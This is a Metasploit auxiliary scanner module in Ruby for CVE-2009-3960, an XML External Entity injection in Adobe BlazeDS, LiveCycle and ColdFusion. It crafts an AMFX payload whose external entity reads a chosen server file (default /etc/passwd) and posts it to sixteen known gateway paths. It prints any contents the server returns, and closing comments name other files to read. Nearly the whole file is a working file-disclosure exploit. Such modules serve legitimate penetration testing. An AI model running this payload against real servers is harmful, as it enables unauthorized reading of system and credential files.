##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Adobe XML External Entity Injection',
      'Description' => %q{
          Multiple Adobe Products -- XML External Entity Injection. Affected Sofware: BlazeDS 3.2 and
        earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and
        2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2
      },
      'References'  =>
        [
          [ 'CVE', '2009-3960' ],
          [ 'OSVDB', '62292' ],
          [ 'BID', '38197' ],
          [ 'URL', 'http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf' ],
          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-05.html'],
        ],
      'Author'      => [ 'CG' ],
      'License'     => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(8400),
        OptString.new('FILE', [ true,  "File to read", '/etc/passwd']),
      ],self.class)
  end

  def run_host(ip)
    path = [
      "/flex2gateway/",
      "/flex2gateway/http",  # ColdFusion 9 (disabled by default), works on some CF 8 though :-)
      "/flex2gateway/httpsecure", # ColdFusion 9 (disabled by default) SSL
      "/flex2gateway/cfamfpolling",
      "/flex2gateway/amf",
      "/flex2gateway/amfpolling",
      "/messagebroker/http",
      "/messagebroker/httpsecure", #SSL
      "/blazeds/messagebroker/http", # Blazeds 3.2
      "/blazeds/messagebroker/httpsecure", #SSL
      "/samples/messagebroker/http", # Blazeds 3.2
      "/samples/messagebroker/httpsecure", # Blazeds 3.2 SSL
      "/lcds/messagebroker/http", # LCDS
      "/lcds/messagebroker/httpsecure", # LCDS -- SSL
      "/lcds-samples/messagebroker/http", # LCDS
      "/lcds-samples/messagebroker/httpsecure", # LCDS -- SSL
    ]

    postrequest =  "<\?xml version=\"1.0\" encoding=\"utf-8\"\?>"
    postrequest << "<\!DOCTYPE test [ <\!ENTITY x3 SYSTEM \"#{datastore['FILE']}\"> ]>"
    postrequest << "<amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\">"
    postrequest << "<body><object type=\"flex.messaging.messages.CommandMessage\"><traits>"
    postrequest << "<string>body</string><string>clientId</string><string>correlationId</string><string>destination</string>"
    postrequest << "<string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string>"
    postrequest << "<string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object>"
    postrequest << "<traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string>"
    postrequest << "<int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"

    path.each do | check |

      res = send_request_cgi({
        'uri'     => check,
        'method'  => 'POST',
        'version'      => '1.1',
        'Content-Type' => 'application/x-amf',
        'data'         => postrequest
      }, 25)

      if (res.nil?)
        print_error("no response for #{ip}:#{rport} #{check}")
      elsif (res.code == 200 and res.body =~ /\<\?xml version\="1.0" encoding="utf-8"\?\>/)
        print_status("#{rhost}:#{rport} #{check} #{res.code}\n #{res.body}")
      elsif (res and res.code == 302 or res.code == 301)
        print_status(" Received 302 to  #{res.headers['Location']} for #{check}")
      else
        print_error("#{res.code} for #{check}")
        #''
      end
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, Rex::ConnectionError =>e
    print_error(e.message)
  rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
    print_error(e.message)
  end
end

#set FILE /proc/sys/kernel/osrelease
#set FILE /proc/sys/kernel/hostname
